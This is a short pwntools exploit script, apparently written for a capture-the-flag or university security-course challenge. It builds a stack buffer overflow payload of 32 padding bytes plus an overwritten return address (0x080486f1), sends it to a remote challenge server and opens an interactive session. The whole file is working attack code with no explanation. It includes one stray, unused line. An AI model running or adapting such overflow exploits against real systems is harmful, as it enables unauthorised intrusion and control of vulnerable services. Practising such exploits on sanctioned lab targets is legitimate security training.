from pwn import *
import sys
p32(0x080486f1)

host ='mustard.stt.rnl.tecnico.ulisboa.pt'
port = '22153'

s = b'A' * 32 + p32(0x080486f1)

p = remote(host, port)
p.sendline(s)
p.interactive()